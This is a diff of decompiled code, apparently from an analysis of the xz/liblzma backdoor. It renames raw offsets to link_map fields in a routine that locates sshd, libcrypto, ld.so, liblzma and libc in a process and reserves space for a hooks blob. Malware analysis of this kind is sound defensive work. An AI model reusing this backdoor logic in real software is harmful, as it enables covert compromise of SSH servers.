@@ -18,13 +18,12 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
   void **evp_set1_rsa_slot_ptr;
   void **rsa_public_decrypt_slot_ptr;
   elf_info_t *elf_handle;
-  link_map *link_map_cursor;
   backdoor_data_t *maps_state;
   backdoor_hooks_data_t **hooks_data_slot;
   EncodedStringId soname_id;
   BOOL success;
   Elf64_Sym *rtld_global_sym;
-  uchar *rtld_global_base;
+  link_map *link_map_cursor;
   ulong *plt_slot;
   void *liblzma_data_segment;
   char *soname_cursor;
@@ -41,7 +40,7 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
   }
   do {
     // AutoDoc: End-of-list checks insist every required module was seen before we bail out.
-    if (*(ulong *)(r_map + 0x18) == 0) {
+    if (r_map->l_next == (link_map *)0x0) {
       maps_state = data->shared_maps;
       if (maps_state->sshd_link_map == (link_map *)0x0) {
         return FALSE;
@@ -63,14 +62,14 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
       }
       break;
     }
-    if (*(ulong *)r_map == 0) {
+    if (r_map->l_addr == 0) {
       return FALSE;
     }
-    soname_cursor = *(char **)(r_map + 8);
+    soname_cursor = r_map->l_name;
     if (soname_cursor == (char *)0x0) {
       return FALSE;
     }
-    if (*(ulong *)(r_map + 0x10) == 0) {
+    if (r_map->l_ld == (Elf64_Dyn *)0x0) {
       return FALSE;
     }
     basename_ptr = soname_cursor;
@@ -102,13 +101,13 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
           if (maps_state->liblzma_link_map != (link_map *)0x0) {
             return FALSE;
           }
-          if (0x10465f < *(ulong *)r_map) {
+          if (0x10465f < r_map->l_addr) {
             return FALSE;
           }
-          if ((code *)(*(ulong *)r_map + 0x400000) < scan_link_map_and_init_shared_libs) {
+          if ((code *)(r_map->l_addr + 0x400000) < scan_link_map_and_init_shared_libs) {
             return FALSE;
           }
-          if (*(ulong *)(r_map + 0x18) == 0) {
+          if (r_map->l_next == (link_map *)0x0) {
             return FALSE;
           }
           maps_state->liblzma_link_map = r_map;
@@ -131,22 +130,22 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
           return FALSE;
         }
         elf_handle = data->elf_handles->ldso;
-        rtld_global_base = elf_handle->elfbase->e_ident + rtld_global_sym->st_value;
-        if (r_map <= rtld_global_base) {
+        link_map_cursor = (link_map *)(elf_handle->elfbase->e_ident + rtld_global_sym->st_value);
+        if (r_map <= link_map_cursor) {
           return FALSE;
         }
-        if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)rtld_global_base)) {
+        if (rtld_global_sym->st_size < (ulong)((long)r_map - (long)link_map_cursor)) {
           return FALSE;
         }
         // AutoDoc: For ld.so entries verify the cached dynamic segment matches the runtime `l_info[DT_*]` pointer.
-        if (*(Elf64_Dyn **)(r_map + 0x10) != elf_handle->dynamic_segment) {
+        if (r_map->l_ld != elf_handle->dynamic_segment) {
           return FALSE;
         }
         maps_state->ldso_link_map = r_map;
       }
     }
     maps_state = data->shared_maps;
-    r_map = *(link_map **)(r_map + 0x18);
+    r_map = r_map->l_next;
   } while ((((maps_state->sshd_link_map == (link_map *)0x0) ||
             (maps_state->libcrypto_link_map == (link_map *)0x0)) ||
            (maps_state->ldso_link_map == (link_map *)0x0)) ||
@@ -161,7 +160,7 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
   if (link_map_cursor == (link_map *)0x0) {
     return FALSE;
   }
-  success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,elf_handle);
+  success = elf_info_parse((Elf64_Ehdr *)link_map_cursor->l_addr,elf_handle);
   if (success == FALSE) {
     return FALSE;
   }
@@ -190,14 +189,14 @@ BOOL scan_link_map_and_init_shared_libs(link_map *r_map,backdoor_shared_librarie
 LAB_00104924:
   link_map_cursor = data->shared_maps->libcrypto_link_map;
   if ((link_map_cursor != (link_map *)0x0) &&
-     (success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,data->elf_handles->libcrypto), success != FALSE)
-     ) {
+     (success = elf_info_parse((Elf64_Ehdr *)link_map_cursor->l_addr,data->elf_handles->libcrypto),
+     success != FALSE)) {
     hooks_data_slot = data->hooks_data_slot;
     liblzma_data_segment_size = 0;
     elf_handle = data->elf_handles->liblzma;
     link_map_cursor = data->shared_maps->liblzma_link_map;
     if ((link_map_cursor != (link_map *)0x0) &&
-       (((success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,elf_handle), success != FALSE &&
+       (((success = elf_info_parse((Elf64_Ehdr *)link_map_cursor->l_addr,elf_handle), success != FALSE &&
          ((elf_handle->feature_flags & 0x20) != 0)) &&
         // AutoDoc: Cache liblzma’s writable PT_LOAD and make sure the hooks blob plus scratch space fit inside it.
         (liblzma_data_segment = elf_get_writable_tail_span(elf_handle,&liblzma_data_segment_size,TRUE), 0x597 < liblzma_data_segment_size)))) {
@@ -206,12 +205,12 @@ LAB_00104924:
       *(u64 *)((long)liblzma_data_segment + 0x590) = liblzma_data_segment_size - 0x598;
       link_map_cursor = data->shared_maps->libc_link_map;
       if ((link_map_cursor != (link_map *)0x0) &&
-         (success = elf_info_parse(*(Elf64_Ehdr **)link_map_cursor,data->elf_handles->libc), success != FALSE))
-      {
+         (success = elf_info_parse((Elf64_Ehdr *)link_map_cursor->l_addr,data->elf_handles->libc),
+         success != FALSE)) {
         // AutoDoc: Once libc’s `link_map` is parsed, immediately resolve the `read`/`__errno_location` trampolines.
         success = resolve_libc_read_errno_imports
-                           (data->shared_maps->libc_link_map,data->elf_handles->libc,
-                            data->libc_imports);
+                          (data->shared_maps->libc_link_map,data->elf_handles->libc,
+                           data->libc_imports);
         return (uint)(success != FALSE);
       }
     }
